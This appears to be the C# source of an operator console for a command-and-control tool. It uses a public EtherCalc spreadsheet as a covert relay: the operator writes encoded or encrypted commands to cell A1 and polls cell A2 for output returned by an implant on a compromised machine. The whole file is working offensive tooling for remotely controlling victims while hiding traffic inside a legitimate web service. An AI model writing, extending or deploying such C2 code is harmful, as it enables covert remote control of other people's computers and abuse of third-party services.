using ethercalc_c2;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;
using static System.Net.Mime.MediaTypeNames;

namespace ethercalc_c2_control
{
    public partial class Form1 : Form
    {

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            sheetNumBox.Enabled = false;
            sheetIdBox.Enabled = false;
            confirmationLabel1.Text = "CONFIRMED";
            confirmationLabel1.ForeColor = Color.Green;
            confirmBtn.Enabled = false;
            editBtn.Enabled = true;

            // Make sure older commands are not interpreted.
            Operational.outputChecksum = Crypto.md5(ReadCell("A2"));

            // Reset any previous commands.
            WriteCell("A1", "");

            if(confirmationLabel1.Text == "CONFIRMED" && confirmationLabel2.Text == "CONFIRMED")
            {
                commandText.Text = "Enter a command to execute";
                commandBox.Enabled = true;
            }
            else
            {
                commandText.Text = "Please confirm settings before executing commands";
                commandBox.Enabled = false;
            }
        }

        private void editBtn_Click(object sender, EventArgs e)
        {
            sheetNumBox.Enabled = true;
            sheetIdBox.Enabled = true;
            confirmationLabel1.Text = "UNCONFIRMED";
            confirmationLabel1.ForeColor = Color.DarkOrange;
            confirmBtn.Enabled = true;
            editBtn.Enabled = false;

            if (confirmationLabel1.Text == "CONFIRMED" && confirmationLabel2.Text == "CONFIRMED")
            {
                commandText.Text = "Enter a command to execute";
                commandBox.Enabled = true;
            }
            else
            {
                commandText.Text = "Please confirm settings before executing commands";
                commandBox.Enabled = false;
            }
        }

        private void confirmBtn2_Click(object sender, EventArgs e)
        {
            encryptionKeyBox.Enabled = false;
            useEncryptionCheckbox.Enabled = false;
            confirmationLabel2.Text = "CONFIRMED";
            confirmationLabel2.ForeColor = Color.Green;
            confirmBtn2.Enabled = false;
            editBtn2.Enabled = true;

            if (confirmationLabel1.Text == "CONFIRMED" && confirmationLabel2.Text == "CONFIRMED")
            {
                commandText.Text = "Enter a command to execute";
                commandBox.Enabled = true;
            }
            else
            {
                commandText.Text = "Please confirm settings before executing commands";
                commandBox.Enabled = false;
            }
        }

        private void editBtn2_Click(object sender, EventArgs e)
        {
            encryptionKeyBox.Enabled = true;
            useEncryptionCheckbox.Enabled = true;
            confirmationLabel2.Text = "UNCONFIRMED";
            confirmationLabel2.ForeColor = Color.DarkOrange;
            confirmBtn2.Enabled = true;
            editBtn2.Enabled = false;

            if (confirmationLabel1.Text == "CONFIRMED" && confirmationLabel2.Text == "CONFIRMED")
            {
                commandText.Text = "Enter a command to execute";
                commandBox.Enabled = true;
            }
            else
            {
                commandText.Text = "Please confirm settings before executing commands";
                commandBox.Enabled = false;
            }
        }

        private void WriteCell(string cell, string value)
        {
            string json = "{\"command\":\"set " + cell + " text t " + value + "\"}";
            byte[] data = Encoding.UTF8.GetBytes(json);

            var req = (HttpWebRequest)WebRequest.Create($"https://ethercalc.net/_/{sheetIdBox.Text}.{sheetNumBox.Text}");
            req.Method = "POST";
            req.ContentType = "application/json";
            req.ContentLength = data.Length;

            using (var s = req.GetRequestStream())
                s.Write(data, 0, data.Length);

            req.GetResponse().Close();
        }

        private string ReadCell(string cell)
        {
            using (var wc = new WebClient())
            {
                string json = wc.DownloadString($"https://ethercalc.net/_/{sheetIdBox.Text}.{sheetNumBox.Text}" + "/cells/" + cell);

                Match m = Regex.Match(json, "\"datavalue\":\"([^\"]*)\"");
                return m.Success ? m.Groups[1].Value : null;
            }
        }

        private void sendCommand(string text)
        {
            string command = text;
            if(useEncryptionCheckbox.Checked)
            {
                command = Crypto.encrypt(command, encryptionKeyBox.Text);
            }
            else
            {
                command = Convert.ToBase64String(Encoding.UTF8.GetBytes(command));
            }

            WriteCell("A1", command);
        }

        private void Polling_Tick(object sender, EventArgs e)
        {
            string output = ReadCell("A2");
            
            if(output != null)
            {
                // Decrypt or decode
                if (useEncryptionCheckbox.Checked)
                {
                    output = Crypto.decrypt(output, encryptionKeyBox.Text);
                }
                else
                {
                    output = Encoding.UTF8.GetString(Convert.FromBase64String(output));
                }

                if (Crypto.md5(output) != Operational.outputChecksum && output.Length > 1)
                {
                    Operational.outputChecksum = Crypto.md5(output);
                    commandsOutBox.Text = commandsOutBox.Text + $"\n[*] Output: {output}";
                }
            }
            
        }

        private void commandBox_Enter(object sender, EventArgs e)
        {
            
        }

        private void commandBox_KeyDown(object sender, KeyEventArgs e)
        {
            if(e.KeyCode == Keys.Enter)
            {
                sendCommand(commandBox.Text);
                commandsOutBox.Text = commandsOutBox.Text + $"\n[*] Sent: {commandBox.Text}";
                commandBox.Text = "";
            }
        }
    }
}
